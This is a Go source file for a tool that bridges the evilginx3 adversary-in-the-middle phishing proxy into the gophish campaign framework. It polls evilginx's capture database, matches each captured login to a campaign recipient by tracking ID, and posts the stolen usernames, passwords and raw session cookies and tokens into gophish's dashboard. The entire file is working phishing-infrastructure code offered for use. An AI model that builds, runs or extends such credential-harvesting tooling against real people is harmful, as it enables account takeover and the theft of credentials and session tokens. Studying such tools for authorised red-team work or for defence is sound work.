// evilphish — bridges evilginx3 captures into gophish
// Copyright (C) 2026  Ethan Lacerenza
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

// Command bridge watches an evilginx3 sessions database (read-only) and,
// for each captured login it can correlate to a gophish campaign recipient
// (via the "rid" tracking parameter), replays the capture into gophish's
// own landing-page endpoint so it shows up as native "Submitted Data" in
// the gophish dashboard.
//
// Neither evilginx nor gophish is modified: this only reads evilginx's
// data.db read-only (it's a Redis-protocol/RESP append-only command log,
// parsed directly — see evilginx.go), and makes ordinary HTTP requests
// gophish already knows how to handle.
//
// Usage: bridge -config config.json
//
// Run with -dump-schema first to sanity-check that the file is being
// parsed correctly on your system.
package main

import (
	"flag"
	"log"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func main() {
	configPath := flag.String("config", "config.json", "path to config JSON file")
	dumpSchema := flag.Bool("dump-schema", false, "parse the evilginx data.db and print a summary, then exit")
	flag.Parse()

	cfg, err := LoadConfig(*configPath)
	if err != nil {
		log.Fatalf("config error: %v", err)
	}

	source := NewRESPAOFSource(cfg)

	if *dumpSchema {
		schema, err := source.DumpSchema()
		if err != nil {
			log.Fatalf("could not read %s: %v", cfg.EvilginxDBPath, err)
		}
		log.Printf("summary for %s:\n%s", cfg.EvilginxDBPath, schema)
		return
	}

	gp := NewGophishClient(cfg)

	state, err := LoadState(cfg.StateFilePath)
	if err != nil {
		log.Fatalf("loading state file %s: %v", cfg.StateFilePath, err)
	}

	if cfg.DryRun {
		log.Printf("DRY RUN mode: captures will be logged but NOT sent to gophish. Set \"dry_run\": false in config once you've validated the output.")
	}

	interval := time.Duration(cfg.PollIntervalSeconds) * time.Second
	if interval <= 0 {
		interval = 5 * time.Second
	}

	log.Printf("bridge started: watching %s every %s, forwarding into %s", cfg.EvilginxDBPath, interval, cfg.GophishAPIBaseURL)

	for {
		if err := pollOnce(cfg, source, gp, state); err != nil {
			log.Printf("poll error: %v", err)
		}
		time.Sleep(interval)
	}
}

// loggedSkip remembers which session IDs we've already logged a skip for,
// so sessions that can't be correlated aren't re-logged on every poll.
// In-memory only: it resets on restart, which is fine.
var loggedSkip = map[int64]bool{}

func pollOnce(cfg Config, source SessionSource, gp *GophishClient, state *State) error {
	sessions, err := source.FetchNewSessions(state.LastSeenID)
	if err != nil {
		return err
	}

	for _, sess := range sessions {
		if sess.ID > state.LastSeenID {
			state.LastSeenID = sess.ID
		}

		if !sess.HasAnyCapture() {
			continue // nothing captured yet on this row
		}

		already := state.ForwardedUpdateTime[sess.SessionID]
		if sess.UpdateTime > 0 && sess.UpdateTime <= already {
			continue // already forwarded this exact state of the session
		}

		if !sess.HasCredentials() {
			// Tokens/cookies were captured (e.g. an SSO flow) but there is
			// no plaintext username/password to put into gophish's
			// form-based "Submitted Data". Log it so it isn't missed, but
			// there is nothing meaningful to POST to the landing page.
			log.Printf("session %d (%s, session_id=%s, %s): session cookie/token captured without plaintext credentials — "+
				"not forwarded to gophish (its landing-page capture is form-field based); check evilginx's own session output for the tokens",
				sess.ID, sess.Phishlet, sess.SessionID, sess.RemoteAddr)
			if sess.UpdateTime > 0 {
				state.ForwardedUpdateTime[sess.SessionID] = sess.UpdateTime
			} else {
				state.ForwardedUpdateTime[sess.SessionID] = time.Now().Unix()
			}
			continue
		}

		rid := extractRID(sess.LandingURL, cfg.RidQueryParam)
		if rid == "" {
			// landing_url never changes for a session, so a missing rid is
			// permanent — log it once, then stay quiet on later polls.
			if !loggedSkip[sess.ID] {
				log.Printf("session %d (%s): no %q param found in landing_url %q, skipping — can't correlate to a gophish recipient",
					sess.ID, sess.Phishlet, cfg.RidQueryParam, sess.LandingURL)
				loggedSkip[sess.ID] = true
			}
			continue
		}

		loc, found, err := gp.ResolveRID(rid)
		if err != nil {
			log.Printf("session %d: error resolving rid %q against gophish API: %v", sess.ID, rid, err)
			continue
		}
		if !found {
			// The campaign might appear later, so keep retrying silently;
			// just don't re-log the same miss on every poll.
			if !loggedSkip[sess.ID] {
				log.Printf("session %d: rid %q not found in any gophish campaign (yet) — will keep trying quietly", sess.ID, rid)
				loggedSkip[sess.ID] = true
			}
			continue
		}
		// If it was previously an un-correlatable miss and now resolves,
		// allow its success/forward to be logged again.
		delete(loggedSkip, sess.ID)

		fields := buildFormValues(cfg.FormFieldMapping, sess)

		// Where to POST the capture so gophish records it as "Submitted
		// Data": gophish's phish server. Prefer the explicit local phish
		// URL from config; fall back to the campaign's own URL only if it
		// isn't set. In an evilginx setup the campaign URL points at the
		// evilginx lure, so posting there would NOT reach gophish — this is
		// why gophish_phish_url exists.
		postTarget := cfg.GophishPhishURL
		if postTarget == "" {
			postTarget = loc.CampaignURL
		}

		if cfg.DryRun {
			log.Printf("[DRY RUN] would POST to %s?%s=%s campaign=%q(%d) recipient=%s fields=%v",
				postTarget, cfg.RidQueryParam, rid, loc.Result.Email, loc.CampaignID, loc.Result.Email, fields)
		} else {
			ua := sess.UserAgent
			if ua == "" {
				ua = cfg.SubmitUserAgentFallback
			}
			if err := gp.SubmitCapturedLogin(postTarget, rid, cfg.RidQueryParam, ua, fields); err != nil {
				log.Printf("session %d: failed to submit into gophish: %v", sess.ID, err)
				continue
			}
			log.Printf("session %d: forwarded capture for recipient %s into campaign %d", sess.ID, loc.Result.Email, loc.CampaignID)
		}

		if sess.UpdateTime > 0 {
			state.ForwardedUpdateTime[sess.SessionID] = sess.UpdateTime
		} else {
			state.ForwardedUpdateTime[sess.SessionID] = time.Now().Unix()
		}
	}

	return state.Save(cfg.StateFilePath)
}

// extractRID pulls the tracking parameter out of evilginx's recorded
// landing_url. This only works if the gophish->evilginx redirect preserved
// the query string end to end — verify this with a real test click before
// relying on it.
func extractRID(landingURL, param string) string {
	if landingURL == "" {
		return ""
	}
	u, err := url.Parse(landingURL)
	if err != nil {
		// landing_url wasn't a clean absolute URL; fall back to a raw
		// substring search for "?param=" or "&param=".
		for _, sep := range []string{"?" + param + "=", "&" + param + "="} {
			if idx := strings.Index(landingURL, sep); idx != -1 {
				rest := landingURL[idx+len(sep):]
				if end := strings.IndexAny(rest, "&#"); end != -1 {
					return rest[:end]
				}
				return rest
			}
		}
		return ""
	}
	return u.Query().Get(param)
}

func buildFormValues(mapping map[string]string, sess Session) url.Values {
	vals := url.Values{}
	for formField, tmpl := range mapping {
		v := tmpl
		v = strings.ReplaceAll(v, "{{username}}", sess.Username)
		v = strings.ReplaceAll(v, "{{password}}", sess.Password)
		v = strings.ReplaceAll(v, "{{session_id}}", sess.SessionID)
		v = strings.ReplaceAll(v, "{{phishlet}}", sess.Phishlet)
		v = strings.ReplaceAll(v, "{{remote_addr}}", sess.RemoteAddr)
		v = strings.ReplaceAll(v, "{{update_time}}", strconv.FormatInt(sess.UpdateTime, 10))
		// Raw captured session cookies / auth tokens as JSON. Map a form
		// field to this to have the tokens show up in gophish's Submitted
		// Data alongside the credentials.
		v = strings.ReplaceAll(v, "{{tokens}}", sess.TokensRaw)
		vals.Set(formField, v)
	}
	return vals
}
